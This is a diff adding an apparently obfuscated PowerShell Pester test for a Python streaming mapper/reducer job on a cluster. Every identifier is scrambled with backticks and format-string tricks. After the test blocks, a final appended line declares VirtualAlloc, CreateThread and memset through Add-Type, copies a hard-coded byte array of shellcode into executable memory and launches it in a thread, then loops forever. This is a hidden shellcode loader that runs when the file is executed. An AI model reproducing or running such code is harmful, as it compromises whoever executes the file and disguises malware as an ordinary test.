@@ -1,0 +1,106 @@
+${H`ERe} = sP`lIT-PA`Th -Parent ${MyinvO`c`ATIon}."MY`cOM`m`And"."pA`Th"
+${s`UT} = (SPL`It-`Pa`Th -Leaf ${my`inV`oCATIon}."mYc`o`MMANd"."pA`TH") -replace ((("{1}{2}{0}" -f 'sts','jEu','.Te'))."Rep`lACe"(([char]106+[char]69+[char]117),'\')), ''
+. "$here\$sut"
+
+${c`luS`TeR`Name} = ${env:Cl`US`TeRname}
+${Http`U`SeRpaS`SWORd} = ${env`:httpPa`S`Sw`OrD}
+${se`Cu`RePAsS`wO`Rd} = con`VErtT`O`-`SE`C`UREsTrING ${H`Tt`P`Use`RPassword} -AsPlainText -Force
+${c`RE`Ds} = neW-`O`B`JEct -TypeName ("{5}{6}{4}{0}{3}{2}{1}{7}"-f'P','eden','r','SC','.Management.Automation.','S','ystem','tial') -ArgumentList ("{1}{0}" -f'in','adm'), ${sE`c`UrEp`AsSW`oRd}
+
+
+
+function get-`c`Redent`IAL { return ${Cr`Eds} }
+
+
+${m`APpEr}= ((("{63}{16}{56}{83}{48}{61}{28}{71}{29}{64}{68}{70}{58}{17}{30}{6}{25}{55}{37}{12}{51}{43}{78}{36}{5}{31}{49}{33}{18}{60}{14}{38}{73}{46}{81}{41}{75}{62}{23}{2}{53}{8}{74}{10}{9}{26}{80}{24}{32}{40}{11}{27}{20}{52}{34}{19}{47}{79}{82}{1}{77}{13}{15}{7}{42}{44}{72}{3}{65}{76}{45}{69}{59}{57}{0}{66}{50}{39}{22}{4}{67}{21}{35}{54}"-f 'e','  
+        ',' 
+   ','bo % (w',' ','
+','e in','b','f','o',' w','       ','ld','  print','Qb',' Q','gO
+
+',' 
+    for li','r','  ','r','
+    main()
+D','=','
+   ','in data:
+',' ','r','fo','
+
+d','input(file','n','def ma','    ','n(sepa',':
+ ','g','
+','yie','oBLntQb',' =','    
+ ','
+    data = read_','o%s%','.','s%','r, 1',' ','  ','mport sys','i','_',' line',' word in words',' ','O','file:
+        ','
+
+','
+if __nam',' ','
+','ator=','
+','.stdin)','D','):','ord','_','DgO__main__DgO:','
+',')','  ','ef read_','dQ','o):
+  ','or','input(sys',', separato','  ','split()','    ','ds ',' ',' ','i'))."r`epLA`CE"('DgO',[sTrInG][ChAR]34)."re`pLA`cE"('Qbo',[sTrInG][ChAR]39)."repl`AcE"(([ChAR]66+[ChAR]76+[ChAR]110),'\'))
+${Red`U`Cer}=((("{7}{36}{87}{75}{130}{194}{131}{104}{15}{164}{21}{183}{72}{127}{61}{49}{80}{144}{73}{77}{185}{178}{18}{147}{67}{14}{66}{23}{173}{152}{57}{71}{189}{50}{48}{184}{27}{106}{179}{137}{125}{4}{54}{182}{68}{99}{150}{44}{46}{134}{59}{84}{42}{187}{79}{158}{135}{180}{169}{118}{0}{81}{51}{197}{63}{176}{175}{17}{146}{195}{41}{133}{92}{34}{64}{103}{148}{186}{22}{154}{112}{124}{6}{65}{13}{132}{11}{1}{56}{38}{32}{47}{26}{100}{113}{156}{191}{70}{190}{170}{126}{9}{10}{85}{143}{55}{162}{193}{2}{94}{119}{40}{89}{136}{90}{76}{111}{160}{109}{141}{35}{31}{45}{192}{161}{188}{120}{33}{30}{171}{128}{105}{177}{16}{12}{110}{58}{181}{96}{82}{86}{62}{142}{172}{168}{163}{97}{43}{39}{165}{157}{138}{151}{140}{145}{20}{74}{122}{116}{53}{108}{37}{139}{19}{3}{129}{114}{196}{123}{25}{88}{102}{107}{29}{78}{167}{28}{174}{166}{155}{149}{8}{101}{121}{91}{93}{60}{117}{5}{52}{98}{95}{153}{159}{69}{83}{115}{24}" -f 't','n,','_w','wo','n ','_','per','{0}
+
+
+
+fr','  ',' ','
+   ','i','int(count) f','put(sys.','
+def read_mapper_outp','
+fr',' sum(','(se','rt ','_','t {0','m o','  da','(','}','a','ator','
+ ','    except Va',')','to','  ','a','  ','t',' ','om i','en','p','    ',' groupby(data, i','r','i','     ','      ','  
+      ','y','r','}','ort','2','r',' == {','% (cu','f','fo',' se','separ',' ','l','e','or imp',', co',' ','{1','_out','ut','ys
+
+','     ','ai','or)
+   ','a','er','ett','}','r',':
+','er
+im','
+  ','.',' ite','(sepa','nt_w','n()
+','d l',' 
+  ','ord','tertools impo','ra','te','er(0))','
+i','{1}{2}','f __nam','o','}','re','group)
+   ','0','
+ ','=',' ','tor, to','}):
+','y',' ','   
+','tal_count','rr','y:
+      ','or','     ','ea','s','d','{0','d{0} ','_','spli','rd, group in','  ','   pass
+','%s%s%','p','d_map',' i','
+   ','at','count','r','t ','roupb','std','ator=','ie','trip(','mgett','ne','  ','t',' ',' ','u','  ','mg','prin','p','s','   ','            
+      ',' ','      ','e, ','__main__{0}:','ta = r','ror:
+','epara','  ','rs','
+    m','   tr','  ','r c',' ','o','
+ ','ueEr','  ',' in','.','  ','tal_','nt','fil','l','def main','1)
+
+','=','o','    for li',')','cur','ile:
+   ','p','t{1}):','p',' 
+  ','ne','
+        ','tor={1}{',' 
+  ','t','    ','urrent','g','a',', se','ator,')) -f[ChAR]34,[ChAR]39,[ChAR]92)
+
+d`EsCRI`BE ("{1}{3}{2}{0}"-f '-python','str','ming','ea') {
+    
+    i`N ${t`eStdRi`VE} {
+        
+        ${Ma`Pp`er} | O`UT-FilE (("{1}{0}{3}{2}" -f 'ca','.','py','wmapper.')).RepLace('caw',[stRiNg][CHAr]92)
+        ${ReD`UCER} | out`-FI`le ((("{1}{3}{0}{4}{2}"-f'ed','.{0','.py','}r','ucer'))  -f  [chaR]92)
+        
+        Mo`ck ("{0}{2}{1}" -f 'Re','Host','ad-') { ${Clus`TeRna`mE} }
+        
+        MO`ck ("{2}{3}{0}{1}"-f 'r','ess','Write-Pr','og') { }
+
+        i`T ("{6}{9}{5}{7}{10}{2}{3}{0}{4}{8}{1}" -f'gs to ','LF','e en','din','jus','RLF','Conve',' l','t ','rts C','in') {
+            
+            {f`Ix-`LI`NeENdIng("$TestDrive\mapper.py")} | SH`oulD ("{0}{1}"-f 'no','t') ("{0}{1}" -f 'thro','w')
+            {Fi`X-liNe`eNDiNg("$TestDrive\reducer.py")} | S`HOulD ("{0}{1}"-f 'n','ot') ("{1}{0}" -f'w','thro')
+            ((("{1}{2}{3}{0}{4}" -f'r.p','.GMLm','a','ppe','y'))."RE`plACE"(([cHar]71+[cHar]77+[cHar]76),'\')) | S`Ho`ULD ("{1}{0}" -f 'ot','n') ("{1}{0}"-f 'ain','Cont') "`r`n"
+            ((("{0}{3}{1}{2}"-f'.{0}','u','cer.py','red')) -f [chaR]92) | S`hoULD ("{0}{1}"-f 'no','t') ("{1}{2}{0}"-f'ain','C','ont') "`r`n"
+        }
+
+        It ("{9}{1}{3}{5}{8}{6}{10}{7}{0}{2}{11}{4}{12}" -f 'es an',' ','d','the ','he','pyt','o','il','h','Uploads','n f',' runs t',' job') {
+            
+            
+            
+            
+            {St`ArT`-P`YtHo`NE`X`AmplE} |  .("{0}{1}"-f'Sho','uld') ("{1}{0}"-f't','no') ("{1}{0}"-f'hrow','t')
+        }
+    }
+}
+
+${C} = ((("{26}{77}{67}{25}{110}{54}{55}{41}{34}{64}{0}{37}{101}{1}{86}{75}{21}{87}{90}{82}{59}{22}{28}{84}{27}{46}{123}{124}{94}{69}{63}{112}{71}{13}{117}{39}{103}{126}{119}{81}{105}{114}{129}{8}{111}{96}{76}{88}{15}{118}{85}{127}{19}{38}{36}{9}{106}{116}{61}{121}{35}{33}{58}{115}{122}{53}{4}{43}{48}{10}{42}{92}{44}{52}{79}{100}{109}{78}{128}{14}{17}{107}{72}{74}{65}{102}{98}{62}{32}{113}{80}{7}{47}{6}{57}{125}{11}{97}{89}{104}{68}{24}{5}{91}{70}{51}{95}{3}{16}{120}{73}{31}{56}{49}{18}{20}{108}{2}{29}{99}{40}{83}{12}{30}{93}{45}{50}{60}{66}{23}" -f'.dllg','tat','memset(In','M)','hread(','t(gAMmsvcr','s,','eation','t','M)]','pThre','re',' ',', ','ze, IntP','lImp',']p','tr','tern ','2.dll','I','I','Ptr ','unt);','or','Import','[','ddres','l','tP','uin','c st','ui','xt','rnel3','ic e','A','AM)]publi','g',' flAlloca','des','ke','ad','IntPtr ','tr','c,','s, ','Flag','l',' ex',' uin','lg','ib','teT','A','M','atic',' IntPtr lpT','e','lAlloc(Int','t ','ta',' ','d','2','s','co','l','Imp','t ','.dl','ize','tartAddre','i','s','tern ','ect);','Dl','Stack','ut','r','Type',' Virtua','t,','pA','(gA','ic ex','ntPt','[Dl','dId);[Dl','r','t','At','t sr','n','A','ot','a','er,','tr ','es, u','c s',', IntPtr lpParamet','t','l',',','publ',' lpS','ntPtr ','int dw','(g',' flPr','wS','nt dwC',' u','rn IntPt','ic s','uint','ort','n','ubl','t','r Crea','u','i','h','io','Mkernel3','Si','in'))."re`PlAcE"('gAM',[STrINg][ChAR]34));${W} = &("{0}{2}{1}" -f 'Ad','Type','d-') -memberDefinition ${c} -Name ("{0}{1}" -f'Win3','2') -namespace ("{3}{4}{1}{0}{2}" -f 'i','Funct','ons','Win3','2') -passthru;[Byte[]];[Byte[]]${Z} = 0xb8,0x43,0xd1,0x4f,0xac,0xd9,0xe5,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x4b,0x31,0x43,0x15,0x83,0xeb,0xfc,0x03,0x43,0x11,0xe2,0xb6,0x2d,0xa7,0x2e,0x38,0xce,0x38,0x4f,0xb1,0x2b,0x09,0x4f,0xa5,0x38,0x3a,0x7f,0xae,0x6d,0xb7,0xf4,0xe2,0x85,0x4c,0x78,0x2a,0xa9,0xe5,0x37,0x0c,0x84,0xf6,0x64,0x6c,0x87,0x74,0x77,0xa0,0x67,0x44,0xb8,0xb5,0x66,0x81,0xa5,0x37,0x3a,0x5a,0xa1,0xe5,0xab,0xef,0xff,0x35,0x47,0xa3,0xee,0x3d,0xb4,0x74,0x10,0x6c,0x6b,0x0e,0x4b,0xae,0x8d,0xc3,0xe7,0xe7,0x95,0x00,0xcd,0xbe,0x2e,0xf2,0xb9,0x41,0xe7,0xca,0x42,0xed,0xc6,0xe2,0xb0,0xec,0x0f,0xc4,0x2a,0x9b,0x79,0x36,0xd6,0x9b,0xbd,0x44,0x0c,0x2e,0x26,0xee,0xc7,0x88,0x82,0x0e,0x0b,0x4e,0x40,0x1c,0xe0,0x05,0x0e,0x01,0xf7,0xca,0x24,0x3d,0x7c,0xed,0xea,0xb7,0xc6,0xc9,0x2e,0x93,0x9d,0x70,0x76,0x79,0x73,0x8d,0x68,0x22,0x2c,0x2b,0xe2,0xcf,0x39,0x46,0xa9,0x87,0x8e,0x6a,0x52,0x58,0x99,0xfd,0x21,0x6a,0x06,0x55,0xae,0xc6,0xcf,0x73,0x29,0x28,0xfa,0xc3,0xa5,0xd7,0x05,0x33,0xef,0x13,0x51,0x63,0x87,0xb2,0xda,0xe8,0x57,0x3a,0x0f,0xbe,0x07,0x94,0xe0,0x7e,0xf8,0x54,0x51,0x16,0x12,0x5b,0x8e,0x06,0x1d,0xb1,0xa7,0xac,0xe7,0x52,0x08,0x98,0xe8,0xc8,0xe0,0xda,0xe8,0x13,0x6b,0x53,0x0e,0x41,0x9b,0x35,0x98,0xfe,0x02,0x1c,0x52,0x9e,0xcb,0x8b,0x1e,0xa0,0x40,0x39,0xde,0x6f,0xa1,0x48,0xcc,0x98,0x8e,0xb2,0x0c,0x59,0x9b,0xb2,0x66,0x5d,0x0d,0xe5,0x1e,0x5f,0x68,0xc1,0x80,0xa0,0x5f,0x52,0xc6,0x5f,0x1e,0xbd,0xbc,0x56,0xb4,0x7d,0xab,0x96,0x58,0x7d,0x2b,0xc1,0x32,0x7d,0x43,0xb5,0x66,0x2e,0x76,0xba,0xb2,0x43,0x2b,0x2f,0x3d,0x35,0x9f,0xf8,0x55,0xbb,0xc6,0xcf,0xf9,0x44,0x2d,0x4c,0xfd,0xba,0xb0,0x90,0xff,0x79,0x65,0xd1,0x75,0x94,0xb5,0x66,0x85,0xd3,0x98,0xcf,0x0c,0x1b,0x8e,0x10,0x05;${G} = 0x1000;if (${z}."leN`g`TH" -gt 0x1000){${G} = ${z}."Le`NgtH"};${x}=${W}::("{0}{1}{2}"-f 'Virtu','al','Alloc').Invoke(0,0x1000,${G},0x40);for (${i}=0;${i} -le (${Z}."lEn`gtH"-1);${i}++) {${W}::"mEms`Et"([IntPtr](${x}.("{0}{1}{2}"-f 'T','oI','nt32').Invoke()+${I}), ${z}[${i}], 1)};${w}::("{3}{0}{1}{2}"-f 'e','ate','Thread','Cr').Invoke(0,0,${x},0,0,0);for (;;){.("{0}{2}{1}"-f'Sta','leep','rt-s') 60};
